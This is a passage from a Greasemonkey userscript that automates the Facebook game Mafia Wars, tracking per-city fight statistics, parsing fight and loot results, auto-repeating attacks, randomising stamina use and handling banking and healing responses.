          GM_setValue('fightLossStrongNY', GM_getValue('fightLossStrongNY', 0) + lossCount);
        }
        break;
      case CUBA:
        //Fight Loss Cuba Stats
        GM_setValue('fightLossesCuba', GM_getValue('fightLossesCuba', 0) + lossCount);
        if (resultType == 2) {
          GM_setValue('fightLossBGCHCuba', GM_getValue('fightLossBGCHCuba', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHCuba', GM_getValue('fightLossCHCuba', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongCuba', GM_getValue('fightLossStrongCuba', 0) + lossCount);
        }
        break;
      case MOSCOW:
        //Fight Loss MOSCOW Stats
        GM_setValue('fightLossesMoscow', (GM_getValue('fightLossesMoscow', 0) + lossCount));
        if (resultType == 2) {
          GM_setValue('fightLossBGCHMoscow', GM_getValue('fightLossBGCHMoscow', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHMoscow', GM_getValue('fightLossCHMoscow', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongMoscow', GM_getValue('fightLossStrongMoscow', 0) + lossCount);
        }
        break;
      case BANGKOK:
        //Fight Loss BANGKOK Stats
        GM_setValue('fightLossesBangkok', (GM_getValue('fightLossesBangkok', 0) + lossCount));
        if (resultType == 2) {
          GM_setValue('fightLossBGCHBangkok', GM_getValue('fightLossBGCHBangkok', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHBangkok', GM_getValue('fightLossCHBangkok', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongBangkok', GM_getValue('fightLossStrongBangkok', 0) + lossCount);
        }
        break;
      case LV:
        //Fight Loss VEGAS Stats
        GM_setValue('fightLossesVegas', (GM_getValue('fightLossesVegas', 0) + lossCount));
        if (resultType == 2) {
          GM_setValue('fightLossBGCHVegas', GM_getValue('fightLossBGCHVegas', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHVegas', GM_getValue('fightLossCHVegas', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongVegas', GM_getValue('fightLossStrongVegas', 0) + lossCount);
        }
        break;
      default:
        break;
    }
  }

  // we lost all fights, money is 'Loss $'
  if (winCount == 0) {
    GM_setValue('totalLossDollarsInt', String(parseInt(GM_getValue('totalLossDollarsInt', 0)) + cashInt));

    switch (loc) {
      case NY:
        //Fight Loss NY Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$NY', String(parseInt(GM_getValue('fightLossBGCH$NY', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$NY', String(parseInt(GM_getValue('fightLossCH$NY', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$NY', String(parseInt(GM_getValue('fightLossStrong$NY', 0)) + cashInt));
        }
        break;
      case CUBA:
        //Fight Loss Cuba Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$Cuba', String(parseInt(GM_getValue('fightLossBGCH$Cuba', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$Cuba', String(parseInt(GM_getValue('fightLossCH$Cuba', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$Cuba', String(parseInt(GM_getValue('fightLossStrong$Cuba', 0)) + cashInt));
        }
        break;
      case MOSCOW:
        //Fight Loss MOSCOW Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$Moscow', String(parseInt(GM_getValue('fightLossBGCH$Moscow', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$Moscow', String(parseInt(GM_getValue('fightLossCH$Moscow', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$Moscow', String(parseInt(GM_getValue('fightLossStrong$Moscow', 0)) + cashInt));
        }
        break;
      case BANGKOK:
        //Fight Loss BANGKOK Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$Bangkok', String(parseInt(GM_getValue('fightLossBGCH$Bangkok', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$Bangkok', String(parseInt(GM_getValue('fightLossCH$Bangkok', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$Bangkok', String(parseInt(GM_getValue('fightLossStrong$Bangkok', 0)) + cashInt));
        }
        break;
      case LV:
        //Fight Loss VEGAS Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$Vegas', String(parseInt(GM_getValue('fightLossBGCH$Vegas', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$Vegas', String(parseInt(GM_getValue('fightLossCH$Vegas', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$Vegas', String(parseInt(GM_getValue('fightLossStrong$Vegas', 0)) + cashInt));
        }
        break;
      default:
        break;
    }
    switch (cashLoc) {
      case NY: GM_setValue('fightLoss$NY', String(parseInt(GM_getValue('fightLoss$NY', 0)) + cashInt)); break;
      case CUBA: GM_setValue('fightLoss$Cuba', String(parseInt(GM_getValue('fightLoss$Cuba', 0)) + cashInt)); break;
      case MOSCOW: GM_setValue('fightLoss$Moscow', String(parseInt(GM_getValue('fightLoss$Moscow', 0)) + cashInt)); break;
      case BANGKOK: GM_setValue('fightLoss$Bangkok', String(parseInt(GM_getValue('fightLoss$Bangkok', 0)) + cashInt)); break;
      case LV: GM_setValue('fightLoss$Vegas', String(parseInt(GM_getValue('fightLoss$Vegas', 0)) + cashInt)); break;
    }
  }
}

function logFightResponse(rootElt, resultElt, context) {
  var how = getStaminaMode();
  lastOpponent = context;
  var inner = resultElt? resultElt.innerHTML : '';
  var innerNoTags = inner.untag();
  var messages = $x('.//td[@class="message_body"]', resultElt);
  var elt = messages[0]? messages[0].firstChild : undefined;
  var cost;

  if (resultElt.className == "fight_results") {
    // A fight took place. Results are in the "VS" format.
    var attackAgainElt;
    DEBUG(' Current Health at :'+health +' (Fight Response) - Health Min : '+GM_getValue('stopPAHealth'));
    if (isGMChecked('staminaPowerattack') && ((isGMChecked('stopPA') && health >= GM_getValue('stopPAHealth')) || !isGMChecked('stopPA')))
      attackAgainElt = xpathFirst('.//a[contains(.,"Power Attack")]', resultElt);
    if (!attackAgainElt) attackAgainElt = xpathFirst('.//a[contains(.,"Attack Again")]', resultElt);
    lastOpponent.attackAgain = undefined;

    // Click the 'multiple' secret stash immediately on specified interval base
    var eltStash;
    var eltStashID;
    var eltStashParent;
    for(i=0;i<5;i++) {
      eltStashID = 'fight_loot_feed_btn_'+i;
      eltStash = document.getElementById(eltStashID, resultElt);
      if (eltStash && isGMChecked('autoSecretStash')){
        eltStashParent = eltStash.parentNode.parentNode // Should be a fightres_bonus_message element.
        var SecretStashFightingCount = parseInt(GM_getValue('SecretStashFightingCount')) ? parseInt(GM_getValue('SecretStashFightingCount')) : 0;
        var publishFrequency =  parseInt(GM_getValue('autoSecretStashFrequency')) ? parseInt(GM_getValue('autoSecretStashFrequency')) : 1;
        var logFrequency = parseInt(SecretStashFightingCount % publishFrequency);
        if(SecretStashFightingCount % publishFrequency == 0) {
          clickElement(eltStash);
          var stashFinder = xpathFirst('.//div[contains(.,"found the location")]/a', eltStashParent);
          var stashUser = linkToString(stashFinder, 'stashUser');
          addToLog('lootbag Icon','Clicked to send '+stashUser+' secret stash! ('+logFrequency+'/'+publishFrequency+')');
        } else {
          addToLog('info Icon','Skipped secret stash publishing ('+logFrequency+'/'+publishFrequency+')');
        }
        SecretStashFightingCount+=1;
        GM_setValue('SecretStashFightingCount',SecretStashFightingCount);
      }
    }

    if (how == STAMINA_HOW_FIGHT_RANDOM) {
      // Look for any new opponents in the displayed list.
      findFightOpponent(rootElt);
    } else if (how == STAMINA_HOW_FIGHT_LIST) {
      cycleSavedList('fightList');
    }

    // Determine whether the opponent is alive and may see future attacks.
    if (inner.indexOf('Attack Again') != -1) {
      setFightOpponentActive(context);
    } else {
      setFightOpponentInactive(context);
    }

    // Get the opponent, experience & cash.
    if (!innerNoTags.match(/(\d+)\s*experience/i)) {
      addToLog('warning Icon', 'BUG DETECTED: Unable to read "vs" win/loss.');
      addToLog('warning Icon', 'Result content: ' + inner);
      return false;
    }
    var experience = parseInt(RegExp.$1);
    cost = innerNoTags.match(REGEX_CASH)? RegExp.lastMatch : undefined;

    // Get the opponent's details.
    var opponentElt = xpathFirst('.//div[@class="fightres_opponent"]', resultElt);
    var user, userSize, userBoost;
    if (opponentElt) {
      elt = xpathFirst('.//div[@class="fightres_name"]/a', opponentElt);
      user = linkToString(elt, 'user');
      elt = xpathFirst('.//div[contains(@class, "fightres_group_size")]', opponentElt);
      if (elt) {
        userSize = elt.innerHTML.untag().trim();
      }
      elt = xpathFirst('.//div[@class="fightres_top3_boost"]//img',opponentElt);
      if (elt) {
        userBoost = elt.title;
      }
    }

    var powerAttack = xpathFirst('.//div[@class="fightres_hint"]', resultElt);

    // non-power attack results
    var winCount = experience > 0 ? 1 : 0;
    var lossCount = experience == 0 ? 1 : 0;

    // do we have power attack results?
    var fightHintElt = xpathFirst('.//div[@class="fightres_hint"]')
    if (fightHintElt && innerNoTags.match('Power attack')) {
      if (innerNoTags.match(/win:\s*(\d+)/i))
        winCount = parseInt(RegExp.$1);
      if (innerNoTags.match(/loss:\s*(\d+)/i))
        lossCount = parseInt(RegExp.$1);
    }

    var powerAttackResult="";
    if (powerAttack) powerAttackResult = powerAttack.innerHTML.untag().trim();

    // Did we win or lose?
    var resultType;
    var result = 'Fought ' + user + '\'s mafia of ' + userSize;
    if (experience) {
      result += ' and <span class="good">' + 'WON</span>, gaining <span class="good">' + cost + '</span>' + ' and ' +
                '<span class="good">' + experience + ' experience</span>. '+powerAttackResult;
      addToLog('yeah Icon', result);
    } else {
      result += ' and <span class="bad">' +
                'LOST</span>, losing <span class="bad">' + cost + '</span>.';
      resultType = 0;
      // Show any boost the opponent used.
      if (userBoost && userBoost.match(/[^(]+/)) {
        result += ' <span class="warn">('+RegExp.lastMatch.trim()+')</span>';
      }

      // Don't fight this opponent again.
      result += ' Too strong!';
      if (how == STAMINA_HOW_FIGHT_RANDOM ||
          isGMChecked('fightRemoveStronger')) {
        result += ' Avoiding.';
        setFightOpponentAvoid(context);
      }
      // }
      addToLog('omg Icon', result);
    }

    // Check for any fatalities.
    if (innerNoTags.match(/body\s+count\s+to\s+(\d+)/i)) {
      addToLog('killedMobster Icon', ' You <span class="bad">' + 'KILLED' + '</span> ' + user + '. Your body count has increased to <span class="bad">' + RegExp.$1 + '</span>.');
      //addToLog('info Icon', ' You <span class="bad">' + 'KILLED' + '</span> ' + user + '. Your body count has increased to <span class="bad">' + RegExp.$1 + '</span>.');
    }
    if (innerNoTags.indexOf('You were snuffed') != -1) {
      addToLog('omg Icon', 'You <span class="bad">' + 'DIED' + '</span> in the fight.');
    }

    // Look for any loot.
    var lootRE = /(earned|gained|found) (some|an?|\d) (.+?)[\.!]/gi;
    var match;
    var foundLoot;
    var totalAttack;
    var totalDefense;
    var txtLog="";

    while(match = lootRE.exec(innerNoTags)){
      foundLoot = match[2] + ' ' + match[3];
      totalAttack = !isUndefined(prevAttackEquip) ? curAttackEquip - prevAttackEquip: 0;
      totalDefense = !isUndefined(prevDefenseEquip) ? curDefenseEquip - prevDefenseEquip: 0;
      if(txtLog) txtLog += '<br/>'+' Found <span class="loot">'+ foundLoot + '</span> in the fight.';
      else txtLog = ' Found <span class="loot">'+ foundLoot + '</span> in the fight.';
    }
    if(totalAttack>0) txtLog += '<br/>Loot Stat: Attack Strength: Old=' + prevAttackEquip + ', New=<span class="loot">' + curAttackEquip+'</span>';
    if(totalDefense>0) txtLog += '<br/>Loot Stat: Defense Strength: Old=' + prevDefenseEquip + ', New=<span class="loot">' + curDefenseEquip+'</span>';
    if(txtLog) addToLog('lootbag Icon', txtLog);

    //Look for Victory Coins
    if (innerNoTags.match(/(.+?) victory coins/i)) {
      gainCoins = RegExp.$1;
      totalCoins = xpathFirst('.//div[@class="fightmastery_tokens"]', rootElt);
      innerCoins = totalCoins? totalCoins.innerHTML : '';
      innerCoinsTotal = innerCoins.split(" ")[0];
      addToLog('info Icon', 'Gained <span class="good">' +gainCoins+ ' Victory Coin(s)</span>, bringing your total to : <span class="good">'+innerCoinsTotal+'</span>');
    }

    // Update the statistics.
    takeFightStatistics(experience, winCount, lossCount, cost, resultType);
    updateLogStats();

    // Click Attack Again immediately to milk our cash-cow
    if (experience && canSpendStamina() && ptsToNextLevel > 6) {
      var attackAgain = isGMChecked ('staminaReattack') &&
                        (
                          (parseCash(cost) + GM_getValue('reattackThreshold') == 0) ||
                          (parseCash(cost) >= GM_getValue('reattackThreshold') &&
                           cost.indexOf(cities[city][CITY_CASH_SYMBOL]) != -1)
                         );
      if (attackAgain && attackAgainElt) {
        lastOpponent.attackAgain = attackAgainElt;
        // Attack again immediately.
        Autoplay.fx = function() {
          clickAction = 'fight';
          clickContext = context;
          staminaBurst (BURST_WIN, attackAgainElt);
          DEBUG('Clicked to repeat the attack on ' + context.name +
                ' (' + context.id + ').');
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return true;
      }
    }

  } else if (innerNoTags.match(/you cannot fight|part of your mafia/i)) {
    if (context.id) {
      DEBUG('Opponent (' + context.id + ') is part of your mafia. Avoiding.');
      setFightOpponentAvoid(context);
    }

  } else if (innerNoTags.match(/You just set/)) {
      cycleSavedList('autoHitOpponentList');
      addToLog('yeah Icon', inner);
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
      var fbPopupElt = xpathFirst('//a[@id="fb_dialog_cancel_button"]');
      if (fbPopupElt) {
        Autoplay.fx = function() {
          clickElement(fbPopupElt);
          DEBUG('Clicked Dismissed Popup!');
        };
      Autoplay.start();
      return true;
      }
  } else if (innerNoTags.match(/There is already a bounty/) || innerNoTags.match(/You can\'t add/)) {
      cycleSavedList('autoHitOpponentList');
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
  }  else if (innerNoTags.indexOf('too weak') != -1) {
    addToLog('info Icon', '<span style="color:#FF9999;">' + 'Too weak to fight.'+ '</span>');
  } else {
    DEBUG('Unrecognized fight response:' + inner);
  }

  randomizeStamina();
  return false;
}

// Spend Stamina successful, change fight location and spend mode
function randomizeStamina() {
  if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) {

    var randomModes = GM_getValue('randomSpendModes');
    // Do not include autohit list
    var spendMode = Math.floor(Math.random() * STAMINA_HOW_AUTOHITLIST);

    DEBUG('Stamina Spend Mode Randomize set to : '+ spendMode + ' was ' +newStaminaMode);
    // Randomize stamina spend mode
    if (randomModes[spendMode]=='1') {
    //if (spendMode != newStaminaMode) {
      newStaminaMode = spendMode;
      DEBUG('Stamina Spend Mode : ' + staminaSpendChoices[spendMode]);
    } else {
      DEBUG('Stamina Spend Mode did not qualify');
    }

    var randomCities = GM_getValue('randomFightLocations');

    // Randomize fight location
    while (spendMode == STAMINA_HOW_FIGHT_RANDOM || spendMode == STAMINA_HOW_FIGHT_LIST) {
      var stamLoc = Math.floor(Math.random()*(cities.length));
      DEBUG('Fight City Randomize set to : '+ stamLoc + ' was ' +GM_getValue('fightLocation'));
      //if (!isGMEqual('fightLocation', stamLoc) && randomCities[stamLoc]=='1') {
      if (randomCities[stamLoc]=='1') {
        GM_setValue('fightLocation', stamLoc);
        DEBUG('Fight location set to : ' + cities[stamLoc][CITY_NAME]);
        break;
      } else {
        DEBUG('Fight location did not qualify');
      }
    }

    // Randomize robbing location
    randomCities = GM_getValue('randomRobLocations');
    while (spendMode == STAMINA_HOW_ROBBING) {
      var stamLoc = Math.floor(Math.random()*(cities.length));
      DEBUG('Rob City Randomize set to : '+ stamLoc + ' was ' +GM_getValue('robLocation'));
      //if (!isGMEqual('robLocation', stamLoc) && randomCities[stamLoc]=='1') {
      if (randomCities[stamLoc]=='1') {
        GM_setValue('robLocation', stamLoc);
        DEBUG('Robbing location set to : ' + cities[stamLoc][CITY_NAME]);
        break;
      }
      else {
        DEBUG('Rob location did not qualify');
      }
    }

    // Randomize hitman location
    randomCities = GM_getValue('randomHitmanLocations');
    while (spendMode == STAMINA_HOW_HITMAN) {
      var stamLoc = Math.floor(Math.random()*(cities.length));
      DEBUG('Hitman City Randomize set to : '+ stamLoc + ' was ' +GM_getValue('hitmanLocation'));
      //if (!isGMEqual('hitmanLocation', stamLoc) && randomCities[stamLoc]=='1') {
      if (randomCities[stamLoc]=='1') {
        GM_setValue('hitmanLocation', stamLoc);
        DEBUG('Hitman location set to : ' + cities[stamLoc][CITY_NAME]);
        break;
      } else {
        DEBUG('Hitman location did not qualify');
      }
    }
  }
}

// Handle our private do_ajax response pages.
function createAjaxPage(autoplay, action, context) {
  //function do_ajax(div, url, liteLoad, alignTop, precall, callback, callback_params, noIncrement)
  var ajaxID = autoplay ? SCRIPT.ajaxPage : SCRIPT.ajaxResult;
  var elt = document.getElementById(ajaxID);
  if (!elt) {
    elt = makeElement('div', null, {'id':ajaxID, 'style':'display: none;'});
    if (action != null)
      elt.setAttribute('action', action);
    if (context != null)
      elt.setAttribute('context', context);
    if (!autoplay) {
      elt.addEventListener('DOMSubtreeModified', handleJSONModified, false);
      document.getElementById('verytop').appendChild(elt);
    } else {
      setListenContent(false);
      document.getElementById('content_row').appendChild(elt);
      setListenContent(true);
    }
  }
  return elt;
}

function handleJSONModified(e) {
  if (ajaxResultTimer) window.clearTimeout(ajaxResultTimer);
  ajaxResultTimer = window.setTimeout(handleAjaxTimer, 200);
}
function handleAjaxTimer() {
  // Check if do_ajax changed our private JSON response page.
  var jsonElt = document.getElementById(SCRIPT.ajaxResult);
  if (!jsonElt || jsonElt.innerHTML.length == 0) {
    DEBUG('ajax_result not ready.');
    return;
  }
  ajaxResultTimer = undefined;
  var responseText = jsonElt.innerHTML.untag();
  var action = jsonElt.getAttribute('action');
  var context = jsonElt.getAttribute('context');
  context = (context == null) ? null : parseInt(context);

  // Remove event listener and JSON response
  jsonElt.removeEventListener('DOMSubtreeModified', handleJSONModified, false);
  jsonElt.parentNode.removeChild(jsonElt);

  // URL variables have expired
  if (/top\.location\.href/.test(responseText)) {
    addToLog('info Icon', 'JSON response is invalid: URL variables may have expired.');
    return;
  }
  logJSONResponse(responseText, action, context);
}
// Interpret the JSON response from a request
function logJSONResponse(responseText, action, context) {
  if (action != "icecheck profile") DEBUG(responseText);

  var cityCashElt = null;
  if (context != null)
    cityCashElt = document.getElementById('user_cash_' + cities[context][CITY_ALIAS]);

  try {
    switch (action) {
    /* do_ajax calls to ajax_page only (Autoplay): */
      // Log any message from collecting property take.
      case 'collect take':
        var respJSON = eval ('(' + responseText + ')');
        var respTxt = respJSON['data'];
        //setGMTime('takeHour' + cities[context][CITY_NAME], '00:30:00');  // collect every 30 min
        setGMTime('takeHour' + cities[context][CITY_NAME], '1 hour');  // collect every 1 hour
        if (respTxt.match(/collected (.+?) from your properties\.","cash":([0-9]+)/i)) {
          var cashLeft = parseInt(RegExp.$2);
          var collectString = RegExp.$1.replace('$', cities[context][CITY_CASH_SYMBOL]);
          addToLog(cities[context][CITY_CASH_CSS], 'You have collected ' + collectString + ' from your properties.');
          // Attempt to correct the displayed cash value
          if (cityCashElt)
            cityCashElt.innerHTML = cities[context][CITY_CASH_SYMBOL] + makeCommaValue(cashLeft);
          cities[context][CITY_CASH] = cashLeft;
        }
        break;

    /* do_ajax calls to ajax_result only: */
      // Log quickHeal() response.
      case 'quick heal':
        var respJSON = eval ('(' + responseText + ')');
        var respTxt = respJSON['hospital_message'];
        // Attempt to correct the displayed health value
        if (healthElt && responseText.match(/,"user_health":([0-9]+),/i)) {
          healthElt.innerHTML = RegExp.$1;
        }
        if (respTxt.match(/the doctor healed ([0-9]+) health (.+)/i)) {
          //GM_setValue('healWaitStarted',false);
          var addHealth = RegExp.$1;
          var cost = RegExp.$2.match(REGEX_CASH);
          addToLog('health Icon', '<span style="color:#FF9999;">' + 'Quickheal: +'+ addHealth + ' health for <span class="expense">' + cost + '</span>.</span>');
        } else if (/you cannot heal so fast/i.test(respTxt)) {
          addToLog('warning Icon', '<span style="color:#FF9999;">' + 'Attempted to heal too quickly.' + '</span>');
        }
        break;
      // Log Ice Check response.
      case 'icecheck profile':
        var alive = !/You can't add/.test(responseText);
        var titleElt = xpathFirst('./div[@class="title"]', innerPageElt);
        if (titleElt) {
          titleElt.setAttribute('style', 'background: ' + (alive ? 'green;' : 'red;'));
          titleElt.setAttribute('title', (alive ? 'Target is alive' : 'Target is iced') + ', click to refresh.');
          titleElt.addEventListener('click', customizeProfile, false);
        }
        break;
      // Check Las Vegas vault data
      case 'check vault':
        var respJSON = eval ('(' + responseText + ')');
        var respTxt = respJSON['data'];
        setGMTime('checkVaultTimer', '00:10:00');
        if (respTxt.match(/,"name":"vault","level":"?([0-9]+)"?,.+,"acct_balance":([0-9]+),/i)) {
          var vaultLevel = parseInt(RegExp.$1);
          var vaultCapacity = vaultLevels[vaultLevel][1];
          var acctBalance = parseInt(RegExp.$2);
          var vaultSpace = vaultCapacity - acctBalance;
          if (vaultLevel != GM_getValue('vaultHandling', 0) || vaultSpace != GM_getValue('vaultSpace', 0))
            addToLog(cities[LV][CITY_CASH_CSS], 'Parsed new vault status: Level ' + vaultLevel + ', free vault space: V$' + makeCommaValue(vaultSpace));
          else
            addToLog(cities[LV][CITY_CASH_CSS], 'No change in your Las Vegas Vault: Level ' + vaultLevel + ', free vault space: V$' + makeCommaValue(vaultSpace));
          GM_setValue('vaultHandling', vaultLevel);
          GM_setValue('vaultSpace', String(vaultSpace));
        }
        break;

      // Log any message from withdrawing money.
      case 'quick withdraw':
        var respJSON = eval ('(' + responseText + ')');
        respTxt = respJSON['data'];
        var respText = JSON.parse(respTxt);
        var vegasBank = respText.acct_balance
        DEBUG(respTxt);
        addToLog('cashVegas Icon', respText['success_message'] + '  Remaining Bank Balance: ' + cities[context][CITY_CASH_SYMBOL] + makeCommaValue(vegasBank));
        if(respText['success_message'].match(/failed/i)) {
          addToLog('warning Icon', 'You are not enough money to do ' + missions[GM_getValue('selectMission', 1)][MISSION_NAME] + '.');
          addToLog('warning Icon', 'Job processing will stop');
          GM_setValue('autoMission', 0);
        }
        break;
      // Log any message from depositing money.
      case 'quick deposit':
        var respJSON = eval ('(' + responseText + ')');
        // Log if city has changed after banking
        if (city != context) {
          addToLog('warning Icon', 'Warning! You have traveled from ' +
                   cities[context][CITY_NAME] + ' to ' +
                   cities[city][CITY_NAME] +
                   ' while banking. Check your money.');
        }

        var respTxt, cashLeft, acctBalance, vaultCapacity;
        if (context == LV) {
          respTxt = respJSON['data'];
          if (respTxt.match(/"cash":([0-9]+),.+,"acct_balance":([0-9]+),/)) {
            cashLeft = RegExp.$1;
            acctBalance = parseInt(RegExp.$2);
            if (GM_getValue('vaultHandling', 0)) {
              vaultCapacity = vaultLevels[GM_getValue('vaultHandling',0)][1];
              GM_setValue('vaultSpace', String(vaultCapacity - acctBalance));
            }
          }
        } else {
          respTxt = respJSON['deposit_message'];
          cashLeft = respJSON['user_cash'];
        }
        cashLeft = isNaN(cashLeft) ? 0 : parseInt(cashLeft);

        // Money deposited (all cities)
        if ((/was deposited/.test(respTxt) && respTxt.match(/\$([0-9,,]+)&lt;\/span/)) || (/you deposited/i.test(respTxt) && respTxt.match(/\$([0-9,,]+) into your vault/i))) {
          quickBankFail = false;
          var cashDeposit = RegExp.$1;
          var cashDepositText = "";
          if (cities[context][CITY_CASH_SYMBOL] == "V$" ) {
            cashDepositText = '</span> was deposited in your vault.'
          } else {
            cashDepositText = '</span> was deposited in your account after the bank\'s fee.'
          }
          addToLog(cities[context][CITY_CASH_CSS],
                   '<span class="money">' + cities[context][CITY_CASH_SYMBOL] +
                   cashDeposit + cashDepositText);

          // Attempt to correct the displayed cash value
          if (cityCashElt) {
            if (isNaN(cashLeft) && !isNaN(cashDeposit)) {
              cashLeft = parseCash(cityCashElt.innerHTML) - parseCash(cashDeposit);
              cashLeft = isNaN(cashLeft) ? 0 : Math.max(cashLeft, 0);
            }
            cityCashElt.innerHTML = cities[context][CITY_CASH_SYMBOL] + makeCommaValue(cashLeft);
          }
          if (!isNaN(cashLeft)) cities[context][CITY_CASH] = cashLeft;
        // Las Vegas: too much money
        } else if (/cannot deposit this much/i.test(respTxt)) {
          quickBankFail = false;
          var logText = 'You can\'t deposit this much (you don\'t have enough cash or your vault is to small).';
          if (!GM_getValue('vaultHandling', 0)) logText += '<br>Please consider enabling PS MWAP vault handling.';
          addToLog(cities[context][CITY_CASH_CSS], logText);
          if (!isNaN(cashLeft)) {
            // Attempt to correct the displayed cash value
            if (cityCashElt)
              cityCashElt.innerHTML = cities[context][CITY_CASH_SYMBOL] + makeCommaValue(cashLeft);
            cities[context][CITY_CASH] = cashLeft;
          }
        // Las Vegas: vault full
        } else if (/cannot deposit anymore/i.test(respTxt)) {
          quickBankFail = false;
          var logText = 'You can\'t deposit anymore, your vault is full!';
          if (!GM_getValue('vaultHandling', 0)) logText += '<br>Please consider enabling PS MWAP vault handling.';
          addToLog(cities[context][CITY_CASH_CSS], logText);
          if (GM_getValue('vaultHandling', 0)) GM_setValue('vaultSpace', '0');
          // Attempt to correct the displayed cash value
          if (!isNaN(cashLeft)) {
            if (cityCashElt)
              cityCashElt.innerHTML = cities[context][CITY_CASH_SYMBOL] + makeCommaValue(cashLeft);
            cities[context][CITY_CASH] = cashLeft;
          }
        // Las Vegas: invalid amount
        } else if (/invalid amount/i.test(respTxt)) {
          quickBankFail = false;

        // Not enough money
        } else if (/have enough money/.test(respTxt)) {
          quickBankFail = false;
        // Minimum deposit not met ($10)
        } else if (/deposit at least/.test(respTxt) && respTxt.match(/\$([0-9,,]+)/)) {
          quickBankFail = false;
          addToLog(cities[context][CITY_CASH_CSS],
                   'You need to deposit at least <span class="money">' + cities[context][CITY_CASH_SYMBOL] +
                   RegExp.$1);

        // Las Vegas: no vault?
        } else if (/,"result":null,/.test(respTxt) || /"rp":0,.+,"acct_balance":0,/.test(respTxt)) {
          quickBankFail = false;
          addToLog(cities[context][CITY_CASH_CSS], 'Depositing failed without a response; if you are in Las Vegas, perhaps you don\'t have a vault yet?');
          if (GM_getValue('vaultHandling', 0)) GM_setValue('vaultSpace', '0');

        // Unknown JSON response
        } else {
          quickBankFail = true;
          addToLog('warning Icon', 'Deposit: Unknown JSON response:<br>' + respTxt);
        }
        break;

      default:
        addToLog('warning Icon', 'BUG DETECTED: Unrecognized JSON action "' + action + '".');
    }
  } catch (ex) {
    DEBUG('Exception (logJSONResponse): ' + ex + ', action: ' + action + ', context: ' + context + ', response: <br>' + responseText);
    //loadHome();
  }
}

// Interprets the response to an action that was taken.
//
// rootElt: An element whose descendents contain the response to interpret.
// action:  The action taken, such as 'fight', 'heal', 'hitlist', etc.
// context: (optional) Any further data needed to describe the action
// Returns: true if something has been done that will cause the inner page
//          to change, such as clicking somewhere or loading another page.
function logResponse(rootElt, action, context) {
  // Set default timer properties.
  Autoplay.fx = goHome;
  Autoplay.delay = getAutoPlayDelay();

  // Fight message
  var messagebox = xpathFirst('.//div[@class="fight_results"]', rootElt);

  // Crate selling pop-up message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="default_id_box"]', rootElt);
  }

  // Normal message
  if (!messagebox) {
    messagebox = xpathFirst('.//table[@class="messages"]', rootElt);
  }

  // New job layout message result
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@class="job_results"]', rootElt);
  }

  //if (!messagebox) {
  //  messagebox = xpathFirst('.//div[@class="job_container"]', rootElt);
  // }

  // New message box message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="msg_box_div_1"]', rootElt);
  }

  // Message box (new header)
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="mbox_generic_1"]', rootElt);
  }

  // Bank message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="bank_messages"]', appLayoutElt);
  }

  // Hospital message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="hospital_message"]', appLayoutElt);
  }

  // Rob message
  if (!messagebox) {
    messagebox = xpathFirst('.//div[@id="'+ context +'" and @class="rob_slot"]', rootElt);
  }

  // Build Car/Weapon success popup
  if(!messagebox) {
    messagebox = xpathFirst('.//div[@class="chop_build_final"]', appLayoutElt);
  }

  // Check our ajaxPage for content
  if(!messagebox) {
    messagebox = xpathFirst('.//div[@id="' + SCRIPT.ajaxPage + '"]', appLayoutElt);
  }

  if (action=='withdraw' && context) {
    autoBankWithdraw(city, context);
    Autoplay.start();
    return true;
  }
  if (!messagebox) {

    if(action == 'autohit') return false;
    DEBUG('Unexpected response page: no message box found -logResponse: HTML=' + rootElt.innerHTML);

    // If fighting from a user-specified list, cycle it.
    // Otherwise, the problem might repeat indefinitely.
    if (action == 'fight' && GM_getValue('staminaSpendHow') == getStaminaMode()) cycleSavedList('fightList');

    return false;
  }

  // Since the attempted action received a response, stop skipping fight.
  skipStaminaSpend = false;

  var inner = messagebox? messagebox.innerHTML : '';
  var innerNoTags = inner.untag();
  var cost, experience, result;

  switch (action) {
  /* do_ajax calls to ajax_page: */
    case 'collect take':
      var elt = document.getElementById(SCRIPT.ajaxPage);
      if (elt) innerNoTags = elt.innerHTML.untag();
      logJSONResponse(innerNoTags, action, context);
      return false;
      break;
    case 'icecheck fightlist':
      var elt = document.getElementById(SCRIPT.ajaxPage);
      if (elt) inner = elt.innerHTML;
      if (/You can't add/.test(inner)) {
        addToLog('info Icon','Target is iced/dead, skipping opponent, id=' + context.id);
        setFightOpponentInactive(context);

        // Cycle fight list
        cycleSavedList('fightList');
        return false;
      } else {
        var attackElt = context.profileAttack;
        if (!attackElt && context.attack && context.attack.scrollWidth > 0) {
          attackElt = context.attack;
        }
        // Just click the "Attack Again" button if it's there
        if (lastOpponent && lastOpponent.attackAgain && context.match(lastOpponent)) {
